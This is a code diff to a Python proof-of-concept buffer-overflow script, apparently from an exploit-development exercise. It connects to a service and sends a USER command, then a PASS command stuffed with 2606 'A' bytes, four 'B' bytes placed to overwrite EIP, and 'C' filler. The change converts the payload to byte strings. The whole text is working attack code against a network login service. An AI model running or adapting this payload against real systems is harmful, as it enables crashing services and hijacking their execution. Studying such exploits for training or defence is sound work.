@@ -10,7 +10,7 @@ MAX_BUFFER_SIZE = 2750
 EIP_OFFSET = 2606
 
 # POC - send 4 bytes to the EIP
-buffer = EIP_OFFSET * 'A' + 4 * 'B' + (MAX_BUFFER_SIZE - EIP_OFFSET - 4) * 'C'
+buffer = EIP_OFFSET * b'A' + 4 * b'B' + (MAX_BUFFER_SIZE - EIP_OFFSET - 4) * b'C'
 
 try:
     # Connect
@@ -19,17 +19,15 @@ try:
 
     # Send Username
     welcome = s.recv(1024)
-    username = ('USER Aviv' + '\r\n').encode()
+    username = b'USER Aviv' + b'\r\n'
     s.send(username)
 
     # Send Password
     greet_user = s.recv(1024)
-    password = ('PASS ' + buffer +  '\r\n').encode()
-
-    print(f'Attempting to send {len(buffer)} bytes.')
+    password = b'PASS ' + buffer +  b'\r\n'
     s.send(password)
 
-    print('\n- Buffer Sent')
+    print('- Completed')
 
 except Exception as e:
     print(e)
